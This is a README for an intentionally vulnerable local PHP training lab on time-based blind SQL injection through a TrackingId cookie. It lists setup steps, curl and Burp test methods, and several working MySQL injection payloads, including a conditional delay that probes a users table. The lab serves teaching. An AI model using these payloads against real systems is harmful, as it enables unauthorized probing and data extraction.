# Lab 5: Blind SQL Injection with Time Delays

## 🎯 Quick Start

1. **Setup Database**: Visit `http://localhost/lab5/setup.php`
2. **Start Lab**: Go to `http://localhost/lab5/index.php`
3. **Objective**: Exploit blind SQL injection to cause a 10 second delay
4. **Target**: TrackingId cookie (automatically set when you visit the page)

## 🎯 Lab Goal

Cause a 10-second delay by exploiting the blind SQL injection vulnerability in the TrackingId cookie.

## 📁 Files Structure

- `index.php` - Main shop page with vulnerable tracking functionality
- `config.php` - Database configuration and vulnerable tracking functions
- `database.sql` - Database schema and seed data
- `setup.php` - Automated database setup
- `lab5_documentation.md` - Complete walkthrough and analysis

## 🔍 How to Test

### Method 1: Browser Developer Tools
1. Open DevTools (F12) → Application/Storage → Cookies
2. Find TrackingId cookie
3. Change value to: `x'||SLEEP(10)--`
4. Refresh the page
5. Observe 10-second delay

### Method 2: Burp Suite
1. Intercept the request to index.php
2. Modify the TrackingId cookie value
3. Forward the request
4. Observe response timing

### Method 3: curl Command
```bash
curl -H "Cookie: TrackingId=x'||SLEEP(10)--" http://localhost/lab5/index.php
```

## ⚡ Working Payloads

**Basic Time Delay (10 seconds)**:
```
TrackingId=x'||SLEEP(10)--
```

**Alternative Payloads**:
```
TrackingId=x'+AND+SLEEP(10)--
TrackingId=x'||(SELECT SLEEP(10))--
TrackingId=x'+OR+BENCHMARK(10000000,MD5(1))--
```

**Conditional Time Delays**:
```
TrackingId=x'||IF((SELECT COUNT(*) FROM users)>0,SLEEP(10),0)--
```

## ⚠️ Important Notes

- This is an intentionally vulnerable application for educational purposes
- Do not use any of this code in production environments
- The vulnerability allows time-based data extraction
- Success is indicated by increased page load times

## 📚 Learn More

Read the complete documentation in `lab5_documentation.md` for:
- Detailed step-by-step solution
- Code analysis (vulnerable vs secure)
- Understanding blind SQL injection techniques
- Advanced exploitation methods
- Proper mitigation strategies

Happy hacking! 🕵️‍♀️